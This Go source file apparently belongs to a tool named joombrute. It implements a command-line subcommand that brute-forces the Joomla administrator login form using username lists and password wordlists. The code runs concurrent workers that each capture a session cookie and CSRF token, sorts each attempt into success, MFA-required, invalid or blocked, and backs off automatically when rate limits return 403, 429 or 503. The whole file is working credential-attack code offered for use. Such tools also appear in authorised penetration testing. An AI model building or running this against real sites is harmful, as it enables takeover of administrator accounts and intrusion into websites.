package main

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/rvzsec/joombrute/internal/brute"
	"github.com/rvzsec/joombrute/internal/joomla"
	"github.com/spf13/cobra"
)

type bruteFlags struct {
	usernamesFile     string
	username          string
	passwordsFile     string
	concurrency       int
	timeout           time.Duration
	refreshEvery      int
	stopOnSuccess     bool
	stopOnMFA         bool
	backoff           time.Duration
	formFetchAttempts int
}

var bflags bruteFlags

func newBruteCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "brute",
		Short: "Bruteforce the Joomla admin login form (J3/J4/J5)",
		Long: `Bruteforce the /administrator/ login form.

Each worker owns its own HTTP client + cookie jar (= its own Joomla session).
The first GET captures the session cookie and the rotating 32-hex CSRF token;
subsequent POSTs reuse that token (Joomla rotates per-session, not per-attempt).

Outcomes classified per attempt:
  success - landed on the admin control panel
  mfa-required - credentials valid but captive MFA screen gates us
  invalid - bad password or bad username
  blocked - 403/429/503 (back-off applied automatically)`,
		RunE: runBrute,
	}
	f := cmd.Flags()
	f.StringVar(&bflags.usernamesFile, "users", "", "File with one username per line")
	f.StringVar(&bflags.username, "user", "", "Single username")
	f.StringVarP(&bflags.passwordsFile, "wordlist", "w", "", "Password wordlist (required)")
	f.IntVarP(&bflags.concurrency, "concurrency", "c", 10, "Concurrent workers")
	f.DurationVar(&bflags.timeout, "request-timeout", 15*time.Second, "Per-request timeout")
	f.IntVar(&bflags.refreshEvery, "refresh-every", 0, "Re-fetch login form every N attempts (0 = once per worker)")
	f.BoolVar(&bflags.stopOnSuccess, "stop-on-success", true, "Halt all workers on first valid credential")
	f.BoolVar(&bflags.stopOnMFA, "stop-on-mfa", false, "Treat MFA-required as a stop signal")
	f.DurationVar(&bflags.backoff, "backoff", 5*time.Second, "Sleep after a blocked response")
	f.IntVar(&bflags.formFetchAttempts, "form-fetch-attempts", 3,
		"Retry GET /administrator/ this many times on 500/transport error before giving up on the worker")
	return cmd
}

func runBrute(_ *cobra.Command, _ []string) error {
	if gflags.URL == "" {
		return fmt.Errorf("--url is required")
	}
	if bflags.passwordsFile == "" {
		return fmt.Errorf("--wordlist is required")
	}
	if bflags.username == "" && bflags.usernamesFile == "" {
		return fmt.Errorf("either --user or --users is required")
	}

	sink, closer := buildSink()
	defer closer()

	t, err := joomla.NewTarget(gflags.URL)
	if err != nil {
		return err
	}

	usernames, err := loadUsernames(bflags.username, bflags.usernamesFile)
	if err != nil {
		return err
	}
	if len(usernames) == 0 {
		return fmt.Errorf("no usernames to try")
	}

	sink.Infof("target=%s  users=%d  wordlist=%s  concurrency=%d",
		t.String(), len(usernames), bflags.passwordsFile, bflags.concurrency)

	// Sigint -> graceful shutdown.
	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()

	stats, err := brute.Run(ctx, brute.Config{
		Target:            t,
		Usernames:         usernames,
		PasswordFile:      bflags.passwordsFile,
		Concurrency:       bflags.concurrency,
		Proxy:             gflags.Proxy,
		UserAgent:         gflags.UserAgent,
		InsecureTLS:       gflags.InsecureTLS,
		RequestTimeout:    bflags.timeout,
		RefreshEvery:      bflags.refreshEvery,
		StopOnSuccess:     bflags.stopOnSuccess,
		StopOnMFA:         bflags.stopOnMFA,
		BackoffBlocked:    bflags.backoff,
		FormFetchAttempts: bflags.formFetchAttempts,
		Sink:              sink,
	})
	if err != nil {
		return err
	}

	sink.Infof("done  attempted=%d  valid=%d  mfa=%d  blocked=%d  errors=%d  elapsed=%s",
		stats.Attempted, stats.Valid, stats.MFAGuarded, stats.Blocked, stats.Errors, stats.Elapsed)
	return nil
}

// loadUsernames merges --user and --users into a deduped, ordered slice.
func loadUsernames(single, file string) ([]string, error) {
	seen := map[string]struct{}{}
	out := []string{}

	add := func(s string) {
		s = strings.TrimSpace(s)
		if s == "" {
			return
		}
		if _, dup := seen[s]; dup {
			return
		}
		seen[s] = struct{}{}
		out = append(out, s)
	}

	if single != "" {
		add(single)
	}
	if file != "" {
		f, err := os.Open(file)
		if err != nil {
			return nil, fmt.Errorf("open users file: %w", err)
		}
		defer f.Close()
		sc := bufio.NewScanner(f)
		sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
		for sc.Scan() {
			add(sc.Text())
		}
		if err := sc.Err(); err != nil {
			return nil, fmt.Errorf("read users file: %w", err)
		}
	}
	return out, nil
}
